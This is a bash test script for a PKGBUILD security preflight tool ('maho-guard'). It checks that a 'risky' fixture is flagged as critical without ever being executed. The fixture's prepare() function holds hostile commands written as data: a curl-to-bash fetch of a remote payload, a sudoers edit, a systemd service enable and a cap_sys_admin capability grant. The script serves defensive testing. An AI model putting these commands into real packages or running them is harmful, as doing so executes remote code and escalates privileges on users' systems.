#!/usr/bin/env bash

set -euo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

export HOME="$TMP/home"
export XDG_STATE_HOME="$TMP/state"
export XDG_CONFIG_HOME="$TMP/config"
export MAHO_ROOT="$ROOT"
export MAHO_PACMAN_DB_ROOT="$TMP/pacman-local"
mkdir -p "$HOME" "$XDG_STATE_HOME" "$XDG_CONFIG_HOME" "$MAHO_PACMAN_DB_ROOT"

BENIGN="$TMP/PKGBUILD.benign"
cat > "$BENIGN" <<'EOF_BENIGN'
pkgname=benign
pkgver=1
pkgrel=1
arch=('x86_64')
package() {
    install -Dm755 benign "$pkgdir/usr/bin/benign"
}
EOF_BENIGN

RISKY="$TMP/PKGBUILD.risky"
cat > "$RISKY" <<'EOF_RISKY'
pkgname=risky
pkgver=1
pkgrel=1
prepare() {
    curl https://example.invalid/payload | bash
    sudo systemctl enable risky.service
    echo x >> /etc/sudoers.d/risky
    setcap cap_sys_admin+ep ./risky
    echo stolen > "$HOME/should-never-exist"
}
EOF_RISKY

fail() { echo "FAIL: $*" >&2; exit 1; }

echo "=== benign PKGBUILD remains low-friction but isolated ==="
OUTPUT="$(bash "$ROOT/bin/maho-guard" pkgbuild "$BENIGN")"
grep -q 'Decision:.*isolated-build' <<< "$OUTPUT"
[ ! -e "$HOME/should-never-exist" ]
RECORD_DIR="$XDG_STATE_HOME/maho/security/preflight"
[ "$(find "$RECORD_DIR" -maxdepth 1 -type f -name 'pkgbuild-*.json' | wc -l)" -eq 1 ]
BENIGN_RECORD="$(find "$RECORD_DIR" -maxdepth 1 -type f -name 'pkgbuild-*.json' | head -1)"
python - "$BENIGN_RECORD" <<'PY'
import json,sys
from pathlib import Path
d=json.loads(Path(sys.argv[1]).read_text())
assert d['static_only'] is True
assert d['pkgbuild_executed'] is False
assert d['recommended_action'] == 'isolated-build'
assert d['risk'] == 'info'
PY
echo "PASS"

echo "=== dangerous PKGBUILD is recognized without execution ==="
OUTPUT="$(bash "$ROOT/bin/maho-guard" pkgbuild "$RISKY")"
grep -q 'Risk:.*critical' <<< "$OUTPUT"
grep -q 'isolated-build-review-required' <<< "$OUTPUT"
[ ! -e "$HOME/should-never-exist" ] || fail "preflight executed untrusted PKGBUILD content"
RISKY_RECORD="$(find "$RECORD_DIR" -maxdepth 1 -type f -name 'pkgbuild-*.json' | sort | tail -1)"
python - "$RISKY_RECORD" <<'PY'
import json,sys
from pathlib import Path
d=json.loads(Path(sys.argv[1]).read_text())
ids={s['id'] for s in d['signals']}
assert d['risk'] == 'critical', d
assert d['score'] == 100, d
assert d['pkgbuild_executed'] is False
assert d['automatic_install'] is False
assert d['network_during_build'] == 'deny-by-default'
assert {'download-pipe-shell','privilege-tool','system-service-change','sudoers-change','file-capability-change'} <= ids, ids
PY
[ "$(stat -c '%a' "$RECORD_DIR")" = 700 ]
[ "$(stat -c '%a' "$RISKY_RECORD")" = 600 ]
echo "PASS"

echo "=== preflight event records proposal without system mutation ==="
python - "$XDG_STATE_HOME/maho/history/events.jsonl" <<'PY'
import json,sys
from pathlib import Path
rows=[]
for line in Path(sys.argv[1]).read_text().splitlines():
    try: rows.append(json.loads(line))
    except Exception: pass
matches=[r for r in rows if r.get('kind') == 'prevention.pkgbuild-preflight']
assert len(matches) == 2, matches
assert matches[-1]['status'] == 'proposed'
assert matches[-1]['risk'] == 'critical'
PY
echo "PASS"

echo "ALL SECURITY PREFLIGHT CONTRACTS PASS"
